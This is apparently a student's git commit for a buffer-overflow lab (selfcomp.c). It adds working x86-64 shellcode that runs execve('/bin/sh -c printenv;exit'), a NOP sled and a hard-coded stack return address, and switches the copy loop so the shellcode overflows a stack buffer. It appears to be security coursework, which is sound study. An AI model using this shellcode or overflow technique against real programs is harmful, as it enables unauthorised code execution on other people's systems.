03689b26a6d9135a8286feb292913439c8336b6d
conrad <19cjf6@queensu.ca>
2022-12-06 02:47:14 -0500

    Finished attacking the server

--- lab5/selfcomp.c
+++ lab5/selfcomp.c
@@ -17,57 +17,61 @@ int main(int argc, char * argv[]){
 
 // VAriable to contain hex bytes of shell code
 char compromise[159] = {
-                                      //bits 64
-                                      //; find out where we are
-    0xEB, 0x52,                    //start:    jmp short codeEnd
-    0x5E,                      //start2:   pop rsi
+    // NOPs
+    0x90, 0x90, 0x90, 0x90, 0x90,
+
+                                        //bits 64
+                            //; find out where we are
+    0xEB, 0x52,                    //start:      jmp short codeEnd
+    0x5E,                      //start2:     pop rsi
                             
-                                      //; clear the A register
-    0x48, 0x31, 0xC0,                            //xor rax, rax    
+                            //; clear the A register
+    0x48, 0x31, 0xC0,                              //xor rax,rax
+                            //; restore null bytes to data
+    0x88, 0x46, 0x07,                              //mov [byte rsi+flagStr-exeStr-2],al      ; move null byte to the end of /bin/sh    
+    0x88, 0x46, 0x0B,                              //mov [byte rsi+cmdStr-exeStr-1],al       ; move null byte to the end of -c
+    0x88, 0x46, 0x19,                              //mov [byte rsi+arrayAddr-exeStr-1],al    ; move null byte to the end of shell command
+    0x48, 0x89, 0x46, 0x32,                            //mov [byte rsi+arrayAddr-exeStr+24],rax  ; move null word to the end of array
                             
-                                      //; restore null bytes to data
-    0x88, 0x46, 0x07,                            //mov [rsi+flagStr-exeStr-2],al      ; move null byte to the end of /bin/sh
-    0x88, 0x46, 0x0B,                            //mov [rsi+cmdStr-exeStr-1],al       ; move null byte to the end of -c
-    0x88, 0x46, 0x19,                            //mov [rsi+arrayAddr-exeStr-1],al    ; move null byte to the end of shell command
-    0x48, 0x89, 0x46, 0x32,                          //mov [rsi+arrayAddr-exeStr+24],rax  ; move null word to the end of array
+                            //; calculate runtime address of each label and store it in the array
+    0x48, 0x89, 0x76, 0x1A,                            //mov [byte rsi+arrayAddr-exeStr],rsi
+    0x48, 0x8D, 0x7E, 0x09,                            //lea rdi, [byte rsi+flagStr-exeStr]
+    0x48, 0x89, 0x7E, 0x22,                            //mov [byte rsi+arrayAddr-exeStr+8],rdi
+    0x48, 0x8D, 0x7E, 0x0C,                            //lea rdi, [byte rsi+cmdStr-exeStr]
+    0x48, 0x89, 0x7E, 0x2A,                            //mov [byte rsi+arrayAddr-exeStr+16],rdi
                             
-                                      //; calculate runtime address of each label and store it in the array
-    0x48, 0x89, 0x76, 0x1A,                          //mov [rsi + arrayAddr - exeStr], rsi
-    0x48, 0x8D, 0x7E, 0x09,                          //lea rdi, [byte rsi + flagStr - exeStr]
-    0x48, 0x89, 0x7E, 0x22,                          //mov [rsi + arrayAddr - exeStr + 8], rdi
-    0x48, 0x8D, 0x7E, 0x0C,                          //lea rdi, [byte rsi + cmdStr - exeStr]
-    0x48, 0x89, 0x7E, 0x2A,                          //mov [rsi + arrayAddr - exeStr + 16], rdi
-                                      
-                                      //; execve system call
-    0xB0, 0x3B,                              //mov al, 0x3b
-    0x48, 0x89, 0xF7,                            //mov rdi, rsi
-    0x48, 0x8D, 0x76, 0x1A,                          //lea rsi, [rsi + arrayAddr - exeStr]
-    0x48, 0x89, 0xE2,                            //mov rdx, rsp
-    0x48, 0xC1, 0xEA, 0x20,                          //shr rdx, 32
-    0x48, 0xC1, 0xE2, 0x20,                          //shl rdx, 32
-    0xBE, 0xFF, 0xE6, 0xFB, 0xF7,                        //mov rsi, 0xf7fbe6ff ; should be ecx
-    0x30, 0xC9,                              //xor cl, cl
-    0x48, 0x09, 0xCA,                            //or rdx, rcx
-    0x48, 0x8B, 0x12,                            //mov rdx,[rdx]
-    0x0F, 0x05,                              //syscall
+                            //; execve system call
+    0xB0, 0x3B,                                //mov al,0x3B
+    0x48, 0x89, 0xF7,                              //mov rdi,rsi
+    0x48, 0x8D, 0x76, 0x1A,                            //lea rsi,[byte rsi+arrayAddr-exeStr]
+    0x48, 0x89, 0xE2,                              //mov rdx,rsp
+    0x48, 0xC1, 0xEA, 0x20,                            //shr rdx,32
+    0x48, 0xC1, 0xE2, 0x20,                            //shl rdx,32
+    0xB9, 0xFF, 0xE6, 0xFB, 0xF7,                          //mov ecx,0xf7fbe6ff
+    0x30, 0xC9,                                //xor cl,cl
+    0x48, 0x09, 0xCA,                              //or  rdx,rcx
+    0x48, 0x8B, 0x12,                              //mov rdx,[rdx]
+    0x0F, 0x05,                                //syscall
                             
-                                      //; exit system call
-    0x48, 0x89, 0xC7,                            //mov rdi,rax
-    0x48, 0x31, 0xC0,                            //xor rax,rax
-    0xB0, 0x3C,                              //mov al,0x3C
-    0x0F, 0x05,                              //syscall
+    0x48, 0x89, 0xC7,                              //mov rdi,rax
+    0x48, 0x31, 0xC0,                              //xor rax,rax
+    0xB0, 0x3C,                                //mov al,0x3C
+    0x0F, 0x05,                                //syscall
                             
-    0xE8, 0xA9, 0xFF, 0xFF, 0xFF,              //codeEnd:  call start2
-                                      //; data
-    0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x58, 0x79,      //exeStr:   db "/bin/shXy"
-    0x2D, 0x63, 0x58,                  //flagStr:  db "-cX"
-    0x70, 0x72, 0x69, 0x6E, 0x74, 0x65, 0x6E, 0x76, 0x3B,     //cmdStr:   db "printenv;exitX"
+    0xE8, 0xA9, 0xFF, 0xFF, 0xFF,              //codeEnd:    call start2
+    0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x58, 0x79,      //exeStr:     db "/bin/shXy"
+    0x2D, 0x63, 0x58,                   //flagStr:    db "-cX"
+    0x70, 0x72, 0x69, 0x6E, 0x74, 0x65, 0x6E, 0x76, 0x3B,      //cmdStr:     db "printenv;exitX"
     0x65, 0x78, 0x69, 0x74, 0x58,         
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,        //arrayAddr:dq 0xffffffffffffffff
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                  //dq 0xffffffffffffffff
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                  //dq 0xffffffffffffffff
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                  //dq 0xffffffffffffffff
-    0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,        //arrayAddr:  dq 0xffffffffffffffff
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                    //dq 0xffffffffffffffff
+
+    // Stack pointer address
+    0x25, 0xE0, 0xFF, 0xFF, 0xFF, 0x7F,
+    // Null byte
+    0x00
 };
 
 // string variable to probe the stack and find the correct
@@ -91,8 +95,8 @@ void doTest(){
        string onto the stack
        - change compromise1 to compromise
          when shell code is written */
-    for (i = 0; compromise1[i]; i++){
-	buffer[i] = compromise1[i];
+    for (i = 0; compromise[i]; i++){
+	buffer[i] = compromise[i];
     }
 }
 
